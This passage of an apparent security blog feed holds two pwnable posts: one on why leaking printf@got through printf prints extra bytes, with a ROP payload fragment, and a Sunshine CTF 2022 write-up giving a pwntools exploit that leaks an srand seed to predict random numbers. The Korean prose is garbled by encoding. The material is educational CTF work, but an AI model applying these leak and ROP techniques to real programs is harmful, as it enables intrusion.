    </entry>
    
    
    
    <entry>
      <title>Why GOT is not printed clearly when using printf</title>
      <link href="/221202-why_got_is_not_printed_clearly_when_using_printf/"/>
      <url>/221202-why_got_is_not_printed_clearly_when_using_printf/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>32bit ÏõåÍ≤åÏûÑ ÌîÑÎ°úÍ∑∏Îû®ÏóêÏÑú GOTÎ•º Ï∂úÎ†•ÌïòÍ≥†Ïûê ÌñàÏùÑ Îïå 4Î∞îÏù¥Ìä∏Í∞Ä Ï∂úÎ†•ÎêòÏßÄ ÏïäÍ≥† Í∑∏ Ïù¥ÏÉÅÏùò Í∞íÏù¥ Ï∂úÎ†•ÎêòÏóàÎã§. Í∑∏ Ïù¥Ïú†Îäî leakÌï† Îïå ÏÇ¨Ïö©Ìïú <code>printf</code> Ìï®ÏàòÎäî null byteÎ•º ÎßåÎÇòÍ∏∞ Ï†ÑÍπåÏßÄ Ï∂úÎ†•ÌïòÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§.</p><h2 id="Why-GOT-is-not-printed-clearly-when-using-printf"><a href="#Why-GOT-is-not-printed-clearly-when-using-printf" class="headerlink" title="Why GOT is not printed clearly when using printf"></a>Why GOT is not printed clearly when using printf</h2><h3 id="printfÎ•º-ÏÇ¨Ïö©ÌïòÏó¨-GOTÎ•º-print-leak-Ìï†-Îïå-Î™ÖÌôïÌïòÍ≤å-ÎêòÏßÄ-ÏïäÎäî-Ïù¥Ïú†"><a href="#printfÎ•º-ÏÇ¨Ïö©ÌïòÏó¨-GOTÎ•º-print-leak-Ìï†-Îïå-Î™ÖÌôïÌïòÍ≤å-ÎêòÏßÄ-ÏïäÎäî-Ïù¥Ïú†" class="headerlink" title="printfÎ•º ÏÇ¨Ïö©ÌïòÏó¨ GOTÎ•º print(leak)Ìï† Îïå Î™ÖÌôïÌïòÍ≤å ÎêòÏßÄ ÏïäÎäî Ïù¥Ïú†"></a>printfÎ•º ÏÇ¨Ïö©ÌïòÏó¨ GOTÎ•º print(leak)Ìï† Îïå Î™ÖÌôïÌïòÍ≤å ÎêòÏßÄ ÏïäÎäî Ïù¥Ïú†</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x2c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(e.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br></pre></td></tr></table></figure><p>32bit ÏõåÍ≤åÏûÑ Î¨∏Ï†úÎ•º ÌíÄÎã§Í∞Ä ropÎ•º Ìï¥ÏïºÌïòÎäî ÏÉÅÌô©Ïù¥ ÏûàÏóàÎã§. libc system Ìï®Ïàò Ïã§Ï†ú Ï£ºÏÜåÎ•º Íµ¨ÌïòÍ∏∞ ÏúÑÌï¥ <code>printf@got</code>Î•º leakÌïòÎ†§Í≥† ÌñàÎäîÎç∞ 4Î∞îÏù¥Ìä∏ Ïù¥ÏÉÅÏùò Î∞îÏù¥Ìä∏Í∞Ä ÏïÑÎûòÏôÄ Í∞ôÏù¥ Ï∂úÎ†•ÎêòÏóàÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0\x0f\xf7–ú\xc7\xf7\x96\x8`\xf1\xc1\xf7\x908\xc7\xf7\xc0p\xc3\xf7</span><br></pre></td></tr></table></figure><p><code>atoi@got</code>Îäî ÍπîÎÅîÌïòÍ≤å 4Î∞îÏù¥Ìä∏Í∞Ä Ï∂úÎ†•ÎêòÏóàÎäîÎç∞ <code>printf@got</code>Îäî 4Î∞îÏù¥Ìä∏ Ïù¥ÏÉÅÏùò Î¨∏ÏûêÏó¥Ïù¥ Ï∂úÎ†•ÎêòÎäî Í≤ÉÏù¥ Ïù¥ÏÉÅÌïòÎã§Í≥† ÏÉùÍ∞ÅÎêòÏñ¥ÏÑú ÎîîÎ≤ÑÍπÖÏùÑ Ìï¥Î≥¥ÏïòÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; der $_got()</span><br><span class="line">0x8049ffc‚îÇ+0x0000:  add BYTE PTR [eax], al</span><br><span class="line">0x804a000‚îÇ+0x0004: 0x8049f14  ‚Üí  &lt;_DYNAMIC+0&gt; add DWORD PTR [eax], eax</span><br><span class="line">0x804a004‚îÇ+0x0008: 0xf7f0ea20  ‚Üí  0x00000000</span><br><span class="line">0x804a008‚îÇ+0x000c: 0xf7eebc00  ‚Üí   endbr32</span><br><span class="line">0x804a00c‚îÇ+0x0010: 0xf7c50f30  ‚Üí  &lt;printf+0&gt; endbr32</span><br><span class="line">0x804a010‚îÇ+0x0014: 0xf7c79cd0  ‚Üí  &lt;getchar+0&gt; endbr32</span><br><span class="line">0x804a014‚îÇ+0x0018: 0x8048396  ‚Üí  &lt;__gmon_start__@plt+6&gt; push 0x10</span><br><span class="line">0x804a018‚îÇ+0x001c: 0xf7c1f160  ‚Üí  &lt;__libc_start_main+0&gt; endbr32</span><br><span class="line">0x804a01c‚îÇ+0x0020: 0xf7c73890  ‚Üí  &lt;setvbuf+0&gt; endbr32</span><br><span class="line">0x804a020‚îÇ+0x0024: 0xf7c370c0  ‚Üí  &lt;atoi+0&gt; endbr32</span><br></pre></td></tr></table></figure><p><code>0x804a00c</code> Ï£ºÏÜåÎ•º Ï∂úÎ†•ÌïòÎ©¥ <code>0xf7c50f30</code>Í∞Ä ÍπîÎÅîÌïòÍ≤å print(leak) Îê† Ï§Ñ ÏïåÏïòÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; print-format -l 40 --bitlen 8 --lang py 0x804a00c</span><br><span class="line">buf = [0x30, 0xf, 0xc5, 0xf7, 0xd0, 0x9c, 0xc7, 0xf7, 0x96, 0x83, 0x4, 0x8, 0x60, 0xf1, 0xc1, 0xf7, 0x90, 0x38, 0xc7, 0xf7, 0xc0, 0x70, 0xc3, 0xf7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>buf = [<span class="number">0x30</span>, <span class="number">0xf</span>, <span class="number">0xc5</span>, <span class="number">0xf7</span>, <span class="number">0xd0</span>, <span class="number">0x9c</span>, <span class="number">0xc7</span>, <span class="number">0xf7</span>, <span class="number">0x96</span>, <span class="number">0x83</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x60</span>, <span class="number">0xf1</span>, <span class="number">0xc1</span>, <span class="number">0xf7</span>, <span class="number">0x90</span>, <span class="number">0x38</span>, <span class="number">0xc7</span>, <span class="number">0xf7</span>, <span class="number">0xc0</span>, <span class="number">0x70</span>, <span class="number">0xc3</span>, <span class="number">0xf7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bytes</span>(buf)</span><br><span class="line"><span class="string">b&#x27;0\x0f\xc5\xf7\xd0\x9c\xc7\xf7\x96\x83\x04\x08`\xf1\xc1\xf7\x908\xc7\xf7\xc0p\xc3\xf7&#x27;</span></span><br></pre></td></tr></table></figure><p>ÌïòÏßÄÎßå ÎÇ¥Í∞Ä Ìï®Ïàò Ï£ºÏÜå leakÌïòÎäî ÏΩîÎìúÎ•º <code>printf</code> Ìï®ÏàòÎ•º Ïù¥Ïö©ÌñàÍ∏∞ ÎïåÎ¨∏Ïóê null byteÍπåÏßÄ Ï∂úÎ†•ÌïòÎäî <code>printf</code> Ìï®Ïàò ÌäπÏÑ±Ïóê ÏùòÌï¥ 4Î∞îÏù¥Ìä∏ Ïù¥ÏÉÅÏù¥ Ï∂úÎ†•Ïù¥ ÎêúÎã§. </p><p><code>atoi@got</code> Í∞ôÏùÄ Í≤ΩÏö∞ÏóêÎäî Î∞îÎ°ú Îí§Í∞Ä null byteÏòÄÍ∏∞ ÎïåÎ¨∏Ïóê 4Î∞îÏù¥Ìä∏Í∞Ä ÍπîÎÅîÌïòÍ≤å Ï∂úÎ†•Îêú Í≤ÉÏù¥ÏóàÎã§. </p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> printf </tag>
            
            <tag> GOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sunshine CTF 2022 - CTF Simulator (srand)</title>
      <link href="/221127-sunshine2022-ctf_simulator/"/>
      <url>/221127-sunshine2022-ctf_simulator/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(74&#x2F;445) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Step right up and compete to improve your guessing CTF skills!</p><p>nc sunshinectf.games 22000</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îî‚îÄ‚îÄ ctf-simulator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf-simulator: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8095b13ea4b618e9e704441f0d78b2e9989b5d14, for GNU/Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Ï†ÑÎ∂Ä Îã§ Í±∏Î†§ÏûàÎã§Í≥† Í≤ÅÎ®πÏúºÎ©¥ ÏïàÎêúÎã§. Ïò§ÌûàÎ†§ Í∞ÑÎã®Ìïú Î¨∏Ï†úÏùº ÏàòÎèÑ ÏûàÎã§.</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>, a3);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> || read(fd, &amp;dest[<span class="number">0x14</span>], <span class="number">4uLL</span>) != <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Fatal error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  srand(*(_DWORD *)&amp;dest[<span class="number">0x14</span>]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;||| CTF Simulator 2022 |||&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This CTF training simulator will hone your guessing skills so you can be more competitive in CTF competitions!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s the name of your CTF team?\n[&gt;] &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  src = sub_1349();</span><br><span class="line">  <span class="keyword">if</span> ( !src )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid team name!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, src, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">10</span>; i &lt;= <span class="number">999999999</span>; i *= <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay %s, I&#x27;m thinking of a number between 1 and %d. What is it?\n[&gt;] &quot;</span>, dest, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    v7 = rand() % i + <span class="number">1</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    src = sub_1349();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(src, <span class="string">&quot;%d&quot;</span>, &amp;v4) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bad guess!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Too low!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Too high!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s it!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wow, did you hack into my brain? Great guessing! You&#x27;ll be a CTF star in no time!&quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Flag file is missing!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(s, <span class="number">100</span>, stream) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error reading from flag file!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  v10 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    *v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a reward for you: %s\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏöîÏïΩÌïòÏûêÎ©¥ <code>for ( i = 10; i &lt;= 999999999; i *= 10 )</code> ÎèôÏïà ÎûúÎç§Ìïú ÏàòÎ•º ÎßûÏ∂∞Ïïº ÌïúÎã§. </p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>CTF team nameÏùÑ ÏûÖÎ†•Ìï† Îïå srand Ïù∏Ïûê leakÏù¥ Í∞ÄÎä•ÌïòÎã§.<br><code>&amp;dest[0x14]</code>Ïóê 4Î∞îÏù¥Ìä∏Î°ú srandÏùò Ïù∏ÏûêÎ°ú <code>/dev/urandom</code>Ïùò ÎûúÎç§Ìïú Í∞íÏùÑ ÏûÖÎ†•ÌïúÎã§. ÌõÑÏóê CTF team nameÏùÑ ÏÇ¨Ïö©ÏûêÏóêÍ≤å srcÏóê ÏûÖÎ†•Î∞õÍ≥† <code>strncpy(dest, src, 0x14uLL);</code> ÏóêÏÑú destÏóê Î≥µÏÇ¨ÌïúÎã§. printfÎäî Í≥µÎ∞±ÍπåÏßÄ Ï∂úÎ†•ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê CTF team nameÏóê 0x14Î•º ÍΩâÍΩâ Ï±ÑÏõåÏÑú ÏûÖÎ†•Ìï¥Ï£ºÎ©¥ <code>&amp;dest[0x14]</code>ÎèÑ Ï∂úÎ†•Ìï† Ïàò ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x55f716d94430: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x55f716d94440: 0xd9fd281441414141      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>srand Ïù∏Ïûê leakÌïòÎäî python ÏΩîÎìú ÏûëÏÑ±</li><li>Ìï¥Îãπ Ïù∏ÏûêÎ•º Í∞ÄÏßÄÍ≥† random ÏàòÎ•º Ï∂úÎ†•ÌïòÎäî c ÌîÑÎ°úÍ∑∏Îû® ÏûëÏÑ±</li><li>Ïù∏ÏûêÎ•º c ÌîÑÎ°úÍ∑∏Îû®Ïóê ÎÑòÍ≤®Ï£ºÏñ¥ random ÏàòÎ•º Ï∂úÎ†•ÌïòÎäî Í≤ÉÏùÑ Î∞õÏïÑÏò§Îäî python ÏΩîÎìú ÏûëÏÑ±</li><li>Î¨∏Ï†ú ÌîÑÎ°úÍ∑∏Îû®Ïóê ÎÑòÍ∏∞Í∏∞</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><p>&#96;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;sunshinectf.games&quot;</span>, <span class="number">22000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./chall&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;CTF team?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x14</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seed = struct.unpack(<span class="string">&#x27;I&#x27;</span>, p.recv(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">info(<span class="built_in">str</span>(seed))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argv1 = [<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">argv1[<span class="number">1</span>] = <span class="built_in">str</span>(seed)</span><br><span class="line"></span><br><span class="line">pp = process(executable=<span class="string">&#x27;./a.out&#x27;</span>, argv=argv1)</span><br><span class="line"></span><br><span class="line">v7 = [<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    v7[i] = pp.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pp.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;[&gt;]&#x27;</span>, v7[i])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc random.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*printf(&quot;%s\n&quot;, argv[1]);*/</span></span><br><span class="line">    <span class="comment">/*printf(&quot;%d\n&quot;, atoi(argv[1]));*/</span></span><br><span class="line">    </span><br><span class="line">    srand(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">10</span>; i &lt; <span class="number">999999999</span>; i *= <span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v7 = rand() % i + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, v7);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="struct-unpack"><a href="#struct-unpack" class="headerlink" title="struct.unpack"></a>struct.unpack</h4><p><code>struct.unpack</code>Ïùò Ï≤´Î≤àÏß∏ Ïù∏ÏûêÎ°ú IÎ•º Ï£ºÎ©¥ byteÎ•º unsigned intÎ°ú Î∞îÍæ∏Ïñ¥Ï£ºÎäî Í≤ÉÏùÑ ÏïåÍ≤å ÎêòÏóàÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;i&#x27;, b&#x27;\x7f\x84\x4e\xcd&#x27;)</span><br><span class="line">(-850492289,)</span><br><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;I&#x27;, b&#x27;\x7f\x84\x4e\xcd&#x27;)</span><br><span class="line">(3444475007,)</span><br></pre></td></tr></table></figure><p><code>struct.unpack</code>Îßå Î≥¥Î©¥ Ïñ¥ÏÉâÌñàÎäîÎç∞ Ïù¥Ï†ú Ï°∞Í∏à ÏùµÏàôÌï¥Ï°åÎã§.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sun&#123;gu355y_ch4ll3ng35_4r3_my_f4v0r1t3!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Sunshine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> random </tag>
            
            <tag> srand </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to RIP control in libc 2.36</title>
      <link href="/221122-how_to_rip_control_in_libc236/"/>
      <url>/221122-how_to_rip_control_in_libc236/</url>
      
